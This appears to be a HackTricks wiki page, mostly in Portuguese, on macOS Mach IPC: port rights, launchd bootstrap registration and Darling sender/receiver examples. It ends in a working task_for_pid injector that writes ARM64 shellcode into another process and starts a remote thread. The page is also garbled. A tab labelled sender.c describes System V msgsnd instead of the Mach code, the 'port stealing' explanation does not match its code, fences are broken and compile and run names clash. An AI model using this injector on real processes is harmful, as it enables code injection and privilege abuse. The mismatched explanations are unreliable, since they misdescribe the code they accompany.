# macOS IPC - Inter Process Communication

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mensagens Mach via Portas

O Mach usa **tarefas** como a **unidade menor** para compartilhar recursos, e cada tarefa pode conter **várias threads**. Essas **tarefas e threads são mapeadas 1:1 para processos e threads POSIX**.

A comunicação entre tarefas ocorre via Comunicação Interprocesso (IPC) do Mach, utilizando canais de comunicação unidirecionais. **As mensagens são transferidas entre portas**, que atuam como **filas de mensagens** gerenciadas pelo kernel.

Os direitos de porta, que definem quais operações uma tarefa pode executar, são fundamentais para essa comunicação. Os possíveis **direitos de porta** são:

* **Direito de recebimento**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, um único consumidor), o que significa que pode haver apenas **um direito de recebimento para cada porta** em todo o sistema (ao contrário dos pipes, onde vários processos podem ter descritores de arquivo para a extremidade de leitura de um pipe).
* Uma **tarefa com o direito de recebimento** pode receber mensagens e **criar direitos de envio**, permitindo que ela envie mensagens. Originalmente, apenas a **própria tarefa tem o direito de recebimento sobre sua porta**.
* **Direito de envio**, que permite enviar mensagens para a porta.
* **Direito de envio único**, que permite enviar uma mensagem para a porta e depois desaparece.
* **Direito de conjunto de porta**, que denota um _conjunto de porta_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Os conjuntos de portas podem ser usados para ouvir várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
* **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se transformam em nomes mortos.

**As tarefas podem transferir direitos de ENVIO para outros**, permitindo que eles enviem mensagens de volta. **Os direitos de ENVIO também podem ser clonados, para que uma tarefa possa duplicar e dar o direito a uma terceira tarefa**. Isso, combinado com um processo intermediário conhecido como **servidor de inicialização**, permite uma comunicação eficaz entre tarefas.

#### Etapas:

Como mencionado, para estabelecer o canal de comunicação, o **servidor de inicialização** (**launchd** no mac) está envolvido.

1. A tarefa **A** inicia uma **nova porta**, obtendo um **direito de RECEBIMENTO** no processo.
2. A tarefa **A**, sendo a detentora do direito de RECEBIMENTO, **gera um direito de ENVIO para a porta**.
3. A tarefa **A** estabelece uma **conexão** com o **servidor de inicialização**, fornecendo o **nome do serviço da porta** e o **direito de ENVIO** por meio de um procedimento conhecido como registro de inicialização.
4. A tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização para o serviço**. Se bem-sucedido, o **servidor duplica o direito de ENVIO** recebido da Tarefa A e **o transmite para a Tarefa B**.
5. Ao adquirir um direito de ENVIO, a tarefa **B** é capaz de **formular** uma **mensagem** e enviá-la **para a tarefa A**.

O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **se passar por qualquer tarefa do sistema**, como falsamente **reivindicar um nome de serviço de autorização** e, em seguida, aprovar todas as solicitações.

Então, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios protegidos pelo SIP: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Ao lado de cada nome de serviço, o **binário associado também é armazenado**. O servidor de inicialização criará e manterá um **direito de RECEBIMENTO para cada um desses nomes de serviço**.

Para esses serviços predefinidos, o **processo de busca difere ligeiramente**. Quando um nome de serviço está sendo procurado, o launchd inicia o serviço dinamicamente. O novo fluxo de trabalho é o seguinte:

* A tarefa **B** inicia uma **busca de inicialização** para um nome de serviço.
* **launchd** verifica se a tarefa está em execução e, se não estiver, a **inicia**.
* A tarefa **A** (o serviço) realiza um **check-in de inicialização**. Aqui, o **servidor de inicialização cria um direito de ENVIO, o retém e transfere o direito de RECEBIMENTO para a tarefa A**.
* launchd duplica o **direito de ENVIO e o envia para a tarefa B**.

No entanto, esse processo se aplica apenas a tarefas predefinidas do sistema. As tarefas não do sistema ainda operam como descrito originalmente, o que poderia permitir a falsificação.

### Exemplo de código

Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de inicialização** enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.

{% tabs %}
{% tab title="undefined" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
O arquivo `sender.c` é um exemplo de um processo que envia mensagens IPC para outro processo. Ele usa a função `msgsnd()` para enviar uma mensagem para a fila de mensagens IPC. A mensagem é composta por uma estrutura `msgbuf` que contém um tipo de mensagem e um corpo de mensagem. O tipo de mensagem é usado pelo receptor para identificar o tipo de mensagem que está recebendo. O corpo da mensagem pode conter qualquer dado que o remetente deseje enviar.

O processo remetente deve primeiro obter a chave da fila de mensagens IPC usando a função `ftok()`. Em seguida, ele deve criar a fila de mensagens IPC usando a função `msgget()`. Depois disso, ele pode enviar mensagens para a fila usando a função `msgsnd()`.

O código a seguir mostra como enviar uma mensagem IPC usando a função `msgsnd()`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define MAX_MSG_SIZE 1024

struct msgbuf {
    long mtype;
    char mtext[MAX_MSG_SIZE];
};

int main(int argc, char *argv[]) {
    key_t key;
    int msgid;
    struct msgbuf msg;

    if (argc != 3) {
        fprintf(stderr, "Usage: %s <key> <message>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    key = atoi(argv[1]);
    msgid = msgget(key, 0666 | IPC_CREAT);
    if (msgid == -1) {
        perror("msgget");
        exit(EXIT_FAILURE);
    }

    msg.mtype = 1;
    strncpy(msg.mtext, argv[2], MAX_MSG_SIZE);
    if (msgsnd(msgid, &msg, strlen(msg.mtext) + 1, 0) == -1) {
        perror("msgsnd");
        exit(EXIT_FAILURE);
    }

    printf("Sent message: %s\n", msg.mtext);

    exit(EXIT_SUCCESS);
}
```

Este código cria uma mensagem IPC com um tipo de mensagem de 1 e um corpo de mensagem especificado pelo segundo argumento da linha de comando. Ele envia a mensagem para a fila de mensagens IPC identificada pela chave especificada pelo primeiro argumento da linha de comando.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Port Stealing

Port stealing is a technique that allows a process to take control of another process's task port. This can be used to elevate privileges or to bypass sandbox restrictions.

The basic idea is to create a new task with `fork()` and then perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) to replace the new task's task port with the target process's task port. Once this is done, the new task can control the target process.

Here's some example code that demonstrates port stealing:

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
[NSThread sleepForTimeInterval:99999];
}
return 0;
}
```

## Entitlements.plist

O arquivo `entitlements.plist` é um arquivo de propriedades que contém informações sobre as permissões e recursos que um aplicativo tem acesso. Ele é usado pelo macOS para verificar se um aplicativo tem permissão para acessar determinados recursos do sistema, como a câmera, o microfone ou a localização do usuário.

Os desenvolvedores podem especificar as permissões necessárias para seus aplicativos no arquivo `entitlements.plist`. Essas permissões são verificadas pelo sistema operacional quando o aplicativo é executado e, se o aplicativo não tiver as permissões necessárias, ele não poderá acessar os recursos correspondentes.

Os arquivos `entitlements.plist` são assinados digitalmente pelo desenvolvedor do aplicativo e verificados pelo sistema operacional durante a instalação do aplicativo. Isso garante que o arquivo não tenha sido modificado por terceiros e que as permissões especificadas sejam confiáveis.

Os arquivos `entitlements.plist` podem ser usados por atacantes para identificar quais permissões um aplicativo tem e quais recursos ele pode acessar. Isso pode ser útil para um atacante que está tentando explorar uma vulnerabilidade no aplicativo ou no sistema operacional.

Os arquivos `entitlements.plist` podem ser encontrados em vários locais no sistema de arquivos do macOS, incluindo dentro de pacotes de aplicativos e frameworks. Eles podem ser visualizados e editados usando o Xcode ou um editor de texto simples.

### Referências

* [Apple Developer Documentation: Entitlement Key Reference](https://developer.apple.com/documentation/bundleresources/entitlements)
* [Apple Developer Documentation: About App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

**Compile** o programa anterior e adicione as **permissões** para poder injetar código com o mesmo usuário (caso contrário, você precisará usar o **sudo**).

<details>

<summary>injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

pid\_t pid = atoi(argv\[1]); inject(pid); }

return 0; }

````
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pid-of-mysleep>
````

#### Injeção de Processo Dylib via Porta de Tarefa

No macOS, as **threads** podem ser manipuladas via **Mach** ou usando a **API posix `pthread`**. A thread gerada na injeção anterior foi gerada usando a API Mach, portanto, **não é compatível com posix**.

Foi possível **injetar um shellcode simples** para executar um comando porque ele **não precisava trabalhar com APIs compatíveis com posix**, apenas com Mach. **Injeções mais complexas** precisariam que a **thread** também fosse **compatível com posix**.

Portanto, para **melhorar o shellcode**, ele deve chamar **`pthread_create_from_mach_thread`**, que irá **criar um pthread válido**. Em seguida, este novo pthread pode **chamar dlopen** para **carregar nossa dylib** do sistema.

Você pode encontrar **exemplos de dylibs** em (por exemplo, aquele que gera um log e depois você pode ouvi-lo):

</details>
